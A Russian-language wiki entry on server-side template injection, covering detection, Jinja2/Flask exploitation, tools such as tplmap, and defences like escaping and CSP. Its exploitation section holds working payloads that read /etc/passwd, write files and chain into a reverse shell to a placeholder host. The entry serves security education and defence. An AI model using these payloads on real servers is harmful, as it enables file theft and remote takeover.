# уязвимость/атака

## Описание
SSTI (server side template injection) - внедрение шаблонов на стороне сервера.
Механизмы шаблонов широко используются веб-приложениями для представления динамических данных через веб-страницы и электронные письма. Небезопасное встраивание пользовательского ввода в шаблоны позволяет внедрить шаблон на стороне сервера. Template Injection можно использовать для прямой атаки на внутренние компоненты веб-серверов и получения удаленного выполнения кода (RCE), превращая каждое уязвимое приложение в потенциальную опорную точку.

## Классификация


Client-side (CS) / Server-side Template Injection (SS)

SSTI различается по типу установленного шаблонизатора: 
- Smarty (PHP)
- Mako (Python)
- Apache Velocity (Java)
- jinja2 (Python)
- Twig (PHP)

[Link](https://www.youtube.com/watch?v=3cT0uE7Y87s)
## Условия
- ОС: любая
- язык: зависит от шаблонизатора (python, php, java)
- компоненты: фреймворк
- настройки: разные


## Детектирование


Для детектирования можно использовать tplmap и ручное тестирование путем ввода различных шаблонов, например:
`{{  7*7  }}`

`{{ 7 * '7'}}`

и т.д. 

Выполнение кода, введенного в шаблоне, сигнализирует о наличии данной  уязвимости.
В некоторых случаях одно выражаение может приводить к разным ответам сервера (в зависимость от того, какой шаблонизатор используется). Например, `{{7*’7′}}` вернёт 49, если используется Twig, 7777777, если используется Jinja2 и не вернёт ничего, если шаблонизатор не используется.


![Рисунок 1](https://1.bp.blogspot.com/-txouq1ZZJw4/Vayv3Np5VGI/AAAAAAAAAFY/6zY9F6SFSEY/s640/Screen%2BShot%2B2015-07-20%2Bat%2B09.21.56.png)

## Информация:


https://portswigger.net/blog/server-side-template-injection
https://nvisium.com/blog/2015/12/07/injecting-flask.html
https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html
https://www.securitylab.ru/analytics/480275.php
https://defcon.ru/web-security/3840/




## Эксплуатация


### Дамп всех используемых классов (Dump all used classes)


`{{ [].class.base.subclasses() }}`

`{{''.class.mro()[1].subclasses()}}`

`{{''.__class__.__mro__[2].__subclasses__()}}`

### Дамп всех переменных конфигурации (Dump all config variables)


	{% for key, value in config.iteritems() %}
		<dt>{{ key|e }}</dt>
   		<dd>{{ value|e }}</dd>
	{% endfor %}

### Чтение из удаленных файлов (Reading remote files)


`''.__class__.__mro__[2].__subclasses__()[40] = File class`

`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`

`{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}`



### Запись в удаленные файлы (Writing into remote files)
`{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt',`

`'w').write('Hello here !') }}`



### Удаленное выполнение кода (RCE)


`{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from`

`subprocess import check_output\n\nRUNCMD = check_output\n') }} # evil config`

`{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  # load the evil config`

`{{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to`

`evil host`










## Инструменты


Tplmap - это инструмент от [epinna](https://github.com/epinna), который помогает эксплуатировать уязвимость SSTI с помощью ряда методов выхода из песочницы, чтобы получить доступ к базовой операционной системе. Он может использовать несколько контекстов кода и сценариев слепого внедрения. [Github](https://github.com/epinna/tplmap)


search.py скрипт от DoubleSigma. [Link](https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py).


## Ущерб


Получение информации с сервера, к которой мы не имеем доступа. Возможность удаленного внедрения кода в серверный скрипт.


## Защита
### Основные меры


Экранирование - технически реализация экранирования заключается в замене определенных символов их безопасными аналогами - html-кодами. Как правило, считаются опасными и подлежат замене 5 символов - это кавычки, знаки больше/меньше и амперсанд, то есть `&`, `<`, `>`, `"`, `'` 


`& --> &amp;`
 
` < --> &lt;`

` > --> &gt;`

` " --> &quot;`

` ' --> &#x27;   ( &apos;  не рекомендуется)`

` / --> &#x2F; `


Политика защиты контента (CSP) - в качестве последней линии защиты вы можете использовать Content Security Policy (CSP), чтобы уменьшить серьезность любых уязвимостей XSS, которые все еще возникают.


Политика защиты контента (CSP) — это дополнительный уровень безопасности, который помогает обнаружить и смягчить некоторые виды атак, в том числе межсайтовый скриптинг (XSS) и инъекцию данных. Эти атаки используются для всего, от кражи данных до порчи сайтов и распространения вредоносного ПО.


### Превентивные меры
Ограничение доступа к внутренней инфраструктуре для потенциально подверженных SSRF серверов.
Обработка данных, введенных пользователем. 


Защита от уязвимостей локального включения файлов (LFI) . Это означает, что вы не должны позволять пользователям контролировать путь к такому файлу или его содержимое.
## Дополнительно
http://xgu.ru/wiki/%D0%A8%D0%B0%D0%B1%D0%BB%D0%BE%D0%BD%D0%B8%D0%B7%D0%B0%D1%82%D0%BE%D1%80 - шаблонизаторы


## Обход защиты


Обход фильтров (Filters bypass) - разработчики включают в web-приложения специальные фильтры для проверки содержимого запросов пользователя на наличие «инородных» данных и тем самым усложняя задачу нарушителя. Однако существуют и появляются новые методы, позволяющие обмануть проверку.
